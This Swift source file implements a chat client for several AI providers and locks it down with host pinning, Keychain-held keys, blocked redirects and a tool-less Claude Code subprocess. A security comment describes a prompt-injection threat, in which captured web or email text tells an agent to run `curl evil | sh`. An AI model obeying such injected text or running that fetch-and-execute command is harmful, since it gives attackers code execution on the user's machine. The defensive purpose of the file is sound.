import Foundation

/// Chat/models client for the active AI provider. One actor for every provider: OpenAI-style
/// `/chat/completions` + `/models` (LM Studio, Ollama, custom localhost, OpenRouter, OpenAI) and
/// Anthropic `/v1/messages` + `/v1/models`, mapped to the same internal response types.
/// Egress is default-deny (LLMConfig.validate() gates every request): local providers must resolve
/// to localhost, a cloud provider may reach exactly ONE host — its official API host — and history
/// excerpts go out only after explicit consent. API keys live in the Keychain, are read per request,
/// are attached ONLY to the pinned cloud host (never to localhost), and are never logged.
/// Non-streaming: consumers need one whole answer, not a token stream.
actor LLMClient {

    struct Message: Codable, Sendable {
        let role: String
        let content: String
    }

    /// Outcome of a connection probe. Custom enum, because Result.Failure must be an Error, and we need a String.
    enum ProbeResult: Sendable, Equatable {
        case ok([String])
        case failed(String)
    }

    /// Generation result + a flag for truncation by the token limit (finish_reason="length").
    struct ChatOutput: Sendable {
        let content: String
        let truncated: Bool
    }

    // MARK: connection check

    /// `GET {base}/models` — list of available models. A lightweight "is the server alive / is the key valid"
    /// probe. No history leaves here, so consent isn't required — but the host pin and the key rules are.
    func listModels(_ cfg: LLMConfig, timeout: TimeInterval = 10) async -> ProbeResult {
        do { try cfg.validate(requireModel: false, requireConsent: false) } catch {
            return .failed((error as? AutomationError)?.errorDescription ?? error.localizedDescription)
        }
        guard let url = Self.endpoint(cfg.normalizedBaseURL, "models") else {
            return .failed("invalid baseURL")
        }
        var req = URLRequest(url: url)
        req.httpMethod = "GET"
        req.timeoutInterval = timeout
        let data: Data
        let resp: URLResponse
        do {
            try Self.applyAuth(&req, cfg)
            (data, resp) = try await Self.session(timeout: timeout).data(for: req)
        } catch {
            // Transport error / auth-header build failure → the probe did NOT succeed.
            return .failed(Self.humanError(error))
        }
        guard let http = resp as? HTTPURLResponse else { return .failed("no HTTP response") }
        guard (200..<300).contains(http.statusCode) else {
            // Non-2xx (e.g. 401 bad key) is a real failure — callers must NOT mask it as connected.
            return .failed("HTTP \(http.statusCode): \(Self.snippet(data))")
        }
        // 2xx: the server is reachable and the key (if any) is accepted. Parse the model list, but an
        // empty OR unparseable body (older API shape) still counts as a SUCCESSFUL probe — return .ok([])
        // so a caller can fall back to a static list rather than reporting a connection failure.
        // OpenAI-compatible AND Anthropic /v1/models share the {data:[{id}]} shape.
        guard let decoded = try? JSONDecoder().decode(ModelsResponse.self, from: data) else {
            return .ok([])
        }
        var ids = decoded.data.map(\.id)
        if cfg.provider == .openai { ids = ids.filter(AIProvider.isChatCapableOpenAIModel) }
        return .ok(ids)
    }

    // MARK: generation

    /// One chat turn, non-streaming. maxTokens caps the output (AutomationSafety).
    /// Cloud: this is the call that carries history excerpts — validate() demands consent here.
    func chat(_ cfg: LLMConfig, system: String, user: String,
              maxTokens: Int, timeout: TimeInterval) async throws -> ChatOutput {
        try cfg.validate()
        // Claude Code is a local subprocess, not an HTTP endpoint — dispatch before the wire switch.
        // maxTokens isn't forwarded: the Claude Code CLI has no output-token cap flag (see claudeCodeChat).
        if cfg.provider.isSubprocess {
            return try await claudeCodeChat(cfg, system: system, user: user, timeout: timeout)
        }
        switch cfg.provider.wire {
        case .openAICompatible:
            return try await openAIChat(cfg, system: system, user: user, maxTokens: maxTokens, timeout: timeout)
        case .anthropicMessages:
            return try await anthropicChat(cfg, system: system, user: user, maxTokens: maxTokens, timeout: timeout)
        }
    }

    // MARK: Claude Code (local CLI subprocess — no API key, no URLSession)

    /// The shape of `claude -p --output-format json`: we only need `result` (the answer) plus the
    /// error/stop flags. Everything else in the payload (usage, cost, ids) is ignored.
    private struct ClaudeCodeResult: Decodable {
        let result: String?
        let is_error: Bool?
        let subtype: String?
        let stop_reason: String?
    }

    /// Path to the `claude` binary. The shared locator is the SINGLE source of truth: it caches, and its
    /// `refresh()` (the "Re-check" button) invalidates that cache. We keep NO second cache here — a stale
    /// copy would survive a refresh and keep invoking a moved/reinstalled binary at the old path.
    private func claudePath() async throws -> String {
        guard let p = await ClaudeCodeLocator.shared.resolve() else {
            throw AutomationError.llm("Claude Code not found — install it and run `claude` once to sign in.")
        }
        return p
    }

    /// Run the user's authenticated Claude Code CLI as a subprocess and map its JSON to ChatOutput.
    /// Prompt goes on stdin; the system prompt uses `--append-system-prompt` when the CLI supports it,
    /// otherwise it's prepended to the user prompt. Neither the prompt nor the answer is ever logged.
    private func claudeCodeChat(_ cfg: LLMConfig, system: String, user: String,
                                timeout: TimeInterval) async throws -> ChatOutput {
        let path = try await claudePath()
        // SECURITY (RCE): `claude -p` would otherwise run as the FULL agent WITH tools (Bash/Edit/Write/
        // WebFetch/…). Our prompt is UNTRUSTED screen-history text, so an injected "run `curl evil | sh`"
        // in a captured web page/email could execute on the user's Mac. Lock it to a pure TEXT generator:
        //   • --tools ""          — empty allow-list of the built-in tool set ⇒ NO Bash/Edit/Write/Read/…
        //   • --strict-mcp-config — with no --mcp-config, load ZERO MCP servers ⇒ no MCP tools appear either
        //   • --permission-mode plan — belt-and-suspenders: plan mode never runs a non-read-only tool
        // Allow-list-empty is deliberate over a deny-list: a deny-list would miss any tool a future CLI adds.
        var args = ["-p", "--output-format", "json",
                    "--tools", "",
                    "--strict-mcp-config",
                    "--permission-mode", "plan"]
        // NOTE: the Claude Code CLI exposes NO output-token cap flag, so `maxTokens` cannot be enforced here
        // (unlike the HTTP providers). We don't pretend to — truncation is detected AFTER the fact from the
        // CLI's top-level `stop_reason` (see the return below). It also exposes no temperature flag, so —
        // unlike the other providers, which pin 0.3 — Claude Code uses its own default temperature.
        let model = cfg.model.trimmingCharacters(in: .whitespacesAndNewlines)
        if !model.isEmpty, model != AIProvider.claudeCodeDefaultModel {
            args += ["--model", model]
        }
        let prompt: String
        let trimmedSystem = system.trimmingCharacters(in: .whitespacesAndNewlines)
        if !trimmedSystem.isEmpty, await ClaudeCodeLocator.shared.supportsAppendSystemPrompt() {
            args += ["--append-system-prompt", system]
            prompt = user
        } else if !trimmedSystem.isEmpty {
            prompt = system + "\n\n" + user
        } else {
            prompt = user
        }

        let data = try await ClaudeCodeRunner.run(path: path, args: args, stdin: prompt, timeout: timeout)
        guard let decoded = try? JSONDecoder().decode(ClaudeCodeResult.self, from: data) else {
            throw AutomationError.llm("unexpected response from Claude Code")
        }
        if decoded.is_error == true {
            throw AutomationError.llm("Claude Code reported an error (\(decoded.subtype ?? "unknown")).")
        }
        guard let text = decoded.result,
              !text.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty else {
            throw AutomationError.llm("empty model response")
        }
        // `claude -p --output-format json` returns a top-level `stop_reason` ("end_turn" on a complete
        // answer, "max_tokens" if the model hit a cap). That's our only truncation signal — since the CLI
        // can't be told to cap output, this is post-hoc detection, not a guarantee.
        return ChatOutput(content: text, truncated: decoded.stop_reason == "max_tokens")
    }

    /// `POST {base}/chat/completions` (LM Studio / Ollama / custom / OpenRouter / OpenAI).
    private func openAIChat(_ cfg: LLMConfig, system: String, user: String,
                            maxTokens: Int, timeout: TimeInterval) async throws -> ChatOutput {
        guard let url = Self.endpoint(cfg.normalizedBaseURL, "chat/completions") else {
            throw AutomationError.llm("invalid baseURL")
        }
        // OpenAI proper: newer models (o*, gpt-5*) reject `max_tokens` and a non-default temperature —
        // send `max_completion_tokens` and omit temperature. Everything else keeps the classic fields.
        let isOpenAI = cfg.provider == .openai
        let body = ChatRequest(
            model: cfg.model,
            messages: [Message(role: "system", content: system), Message(role: "user", content: user)],
            max_tokens: isOpenAI ? nil : maxTokens,
            max_completion_tokens: isOpenAI ? maxTokens : nil,
            temperature: isOpenAI ? nil : 0.3,
            stream: false)

        let data = try await send(cfg, url: url, body: try JSONEncoder().encode(body), timeout: timeout)
        let decoded: ChatResponse
        do { decoded = try JSONDecoder().decode(ChatResponse.self, from: data) }
        catch { throw AutomationError.llm("unexpected response: \(Self.snippet(data))") }
        guard let choice = decoded.choices.first,
              !choice.message.content.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty else {
            throw AutomationError.llm("empty model response")
        }
        return ChatOutput(content: choice.message.content, truncated: choice.finish_reason == "length")
    }

    /// `POST {base}/messages` (Anthropic): x-api-key + anthropic-version headers, required max_tokens,
    /// system prompt as a top-level param. Mapped to the same ChatOutput.
    private func anthropicChat(_ cfg: LLMConfig, system: String, user: String,
                               maxTokens: Int, timeout: TimeInterval) async throws -> ChatOutput {
        guard let url = Self.endpoint(cfg.normalizedBaseURL, "messages") else {
            throw AutomationError.llm("invalid baseURL")
        }
        let body = AnthropicRequest(
            model: cfg.model, max_tokens: maxTokens, system: system,
            messages: [Message(role: "user", content: user)], temperature: 0.3)

        let data = try await send(cfg, url: url, body: try JSONEncoder().encode(body), timeout: timeout)
        let decoded: AnthropicResponse
        do { decoded = try JSONDecoder().decode(AnthropicResponse.self, from: data) }
        catch { throw AutomationError.llm("unexpected response: \(Self.snippet(data))") }
        let text = decoded.content.compactMap { $0.type == "text" ? $0.text : nil }.joined()
        guard !text.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty else {
            throw AutomationError.llm("empty model response")
        }
        return ChatOutput(content: text, truncated: decoded.stop_reason == "max_tokens")
    }

    /// Shared POST plumbing: auth header per provider, status check, human errors. Never logs the request.
    private func send(_ cfg: LLMConfig, url: URL, body: Data, timeout: TimeInterval) async throws -> Data {
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.timeoutInterval = timeout
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.httpBody = body
        try Self.applyAuth(&req, cfg)
        do {
            let (data, resp) = try await Self.session(timeout: timeout).data(for: req)
            guard let http = resp as? HTTPURLResponse else { throw AutomationError.llm("no HTTP response") }
            guard (200..<300).contains(http.statusCode) else {
                throw AutomationError.llm("HTTP \(http.statusCode): \(Self.snippet(data))")
            }
            return data
        } catch let e as AutomationError {
            throw e
        } catch {
            throw AutomationError.llm(Self.humanError(error))
        }
    }

    // MARK: internals

    /// Cloud → attach the Keychain key to the PINNED host only (validate() already ran, so the URL host
    /// is the provider's API host). Local providers get no key ever — nothing to leak to localhost servers.
    private static func applyAuth(_ req: inout URLRequest, _ cfg: LLMConfig) throws {
        guard cfg.provider.isCloud else { return }
        guard let account = cfg.provider.keychainAccount,
              let key = KeychainStore.get(account), !key.isEmpty else {
            throw AutomationError.noAPIKey(cfg.provider.displayName)
        }
        switch cfg.provider.wire {
        case .anthropicMessages:
            req.setValue(key, forHTTPHeaderField: "x-api-key")
            req.setValue("2023-06-01", forHTTPHeaderField: "anthropic-version")
        case .openAICompatible:
            req.setValue("Bearer \(key)", forHTTPHeaderField: "Authorization")
        }
    }

    private struct ChatRequest: Encodable {
        let model: String
        let messages: [Message]
        let max_tokens: Int?              // nil fields are omitted by the synthesized encoder
        let max_completion_tokens: Int?
        let temperature: Double?
        let stream: Bool
    }
    private struct ChatResponse: Decodable {
        struct Choice: Decodable {
            struct Msg: Decodable { let content: String }
            let message: Msg
            let finish_reason: String?
        }
        let choices: [Choice]
    }
    private struct AnthropicRequest: Encodable {
        let model: String
        let max_tokens: Int
        let system: String
        let messages: [Message]
        let temperature: Double
    }
    private struct AnthropicResponse: Decodable {
        struct Block: Decodable {
            let type: String
            let text: String?
        }
        let content: [Block]
        let stop_reason: String?
    }
    private struct ModelsResponse: Decodable {
        struct M: Decodable { let id: String }
        let data: [M]
    }

    /// Joins baseURL + path. Forgives a trailing `/` and a missing `/v1` (we add it if there's neither v1 nor any other
    /// suffix). `endpoint("http://127.0.0.1:11434/v1", "models")` → `.../v1/models`.
    static func endpoint(_ base: String, _ path: String) -> URL? {
        var b = base.trimmingCharacters(in: .whitespaces)
        while b.hasSuffix("/") { b.removeLast() }
        guard !b.isEmpty else { return nil }
        // If base has no version segment — we allow a "bare" host and append /v1 ourselves.
        if let u = URL(string: b), (u.path.isEmpty || u.path == "") { b += "/v1" }
        return URL(string: b + "/" + path)
    }

    /// Blocks ALL HTTP redirects. A 3xx from a probed/pinned host must NEVER make URLSession silently
    /// re-send the request — whose body is a history excerpt and whose headers carry the API key
    /// (x-api-key / Authorization) — to an arbitrary host. That would defeat LLMConfig's host pin.
    /// Passing nil to the completion handler cancels the redirect and delivers the 3xx response as-is.
    /// One shared, stateless instance backs every session this client creates (chat + /models probe).
    private final class NoRedirect: NSObject, URLSessionTaskDelegate, Sendable {
        static let shared = NoRedirect()
        func urlSession(_ session: URLSession, task: URLSessionTask,
                        willPerformHTTPRedirection response: HTTPURLResponse,
                        newRequest request: URLRequest,
                        completionHandler: @escaping (URLRequest?) -> Void) {
            completionHandler(nil)
        }
    }

    private static func session(timeout: TimeInterval) -> URLSession {
        let c = URLSessionConfiguration.ephemeral
        // stream:false → the server stays silent until the whole response is ready, so the idle timeout (timeoutIntervalForRequest)
        // is de facto = the time of full generation. Resource — a generous overall ceiling, so that a cold load of
        // the local model isn't killed prematurely. (The proper long-term fix is stream:true.)
        c.timeoutIntervalForRequest = timeout
        c.timeoutIntervalForResource = max(timeout, 600)
        c.waitsForConnectivity = false
        // NoRedirect is attached to EVERY session — this is the zero-egress guarantee (no redirect leak).
        return URLSession(configuration: c, delegate: NoRedirect.shared, delegateQueue: nil)
    }

    private static func snippet(_ data: Data) -> String {
        let s = String(data: data, encoding: .utf8) ?? ""
        return String(s.prefix(200))
    }

    private static func humanError(_ error: Error) -> String {
        let ns = error as NSError
        if ns.domain == NSURLErrorDomain {
            switch ns.code {
            case NSURLErrorCannotConnectToHost, NSURLErrorCannotFindHost:
                return "server not responding — is the provider running / reachable?"
            case NSURLErrorTimedOut:
                return "timeout — the model is slow to respond or isn't loaded"
            case NSURLErrorNotConnectedToInternet:
                return "no internet connection"
            default: break
            }
        }
        return error.localizedDescription
    }
}
